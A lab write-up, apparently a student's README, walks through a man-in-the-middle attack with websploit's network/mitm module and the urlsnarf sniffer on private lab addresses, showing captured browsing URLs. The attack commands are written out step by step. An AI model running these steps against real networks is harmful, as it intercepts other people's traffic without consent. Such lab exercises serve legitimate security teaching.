<h1>Performing a MITM Attack</h1>


<h2>Description</h2>
In this lab, I learned to perform a MITM attack. MITM (man-in-the-middle) is an eavesdropping attack that occurs whenever a malicious user behaves as a proxy in a communication session.
<br />



<h2>Environments Used </h2>

- <b>Windows Server 2016 Standard</b> 
- <b>Linux VNC-Viewer</b>
- <b>Terminal</b>

<h2>Program walk-through:</h2>

<p align="center">
From the desktop select the "Linux" icon in the top right: <br/>
<img src="https://i.postimg.cc/pLg7bbkK/Screen-Shot-2022-08-26-at-7-01-17-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />
  
  
  
<br />
In the authentication dialog box type in the password and click ok <br/>
<img src="https://i.postimg.cc/NM0RdLTD/Screen-Shot-2022-08-26-at-7-03-13-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />
  
  
  
  
<br />
In the VNC Viewer window go to terminal and type the following commands:  <br/>
1. su - <br/>
2.(enter password) <br/>
3. websploit <br/>
4. show modules <br/>
5. use network/mitm <br/>
6. show options <br/>
7. set interface eth0 <br/>
8. set router 192.168.137.1 <br/>
9. set target 192.168.137.7 <br/>
10. set sniffer urlsnarf <br/>
11. run <br/>
<img src="https://i.postimg.cc/qvT4f5wh/Screen-Shot-2022-08-26-at-7-12-00-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
Minimize the Linux VNC window and then from the desktop open up Windows 8: <br/>
<img src="https://i.postimg.cc/cJcJ5SNL/Screen-Shot-2022-08-26-at-7-13-35-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />





  

<br />
From the windows 8 desktop go to Microsoft Edge and type in an address in the address bar  <br/>
<img src="https://i.postimg.cc/B6cwKmDy/Screen-Shot-2022-08-26-at-7-16-55-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />





<br />
Minmize the Windows 8 remote Desktop and open the Linux VNC Viewer and in the terminal window you will observe the address that you wrote  <br/>
<img src="https://i.postimg.cc/zfn1xSKw/Screen-Shot-2022-08-26-at-7-19-15-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />






<br />
Hit ctrl+z to stop the MITM attack  <br/>
<img src="https://i.postimg.cc/WbQKxq25/Screen-Shot-2022-08-26-at-7-22-02-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />


















  
  
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
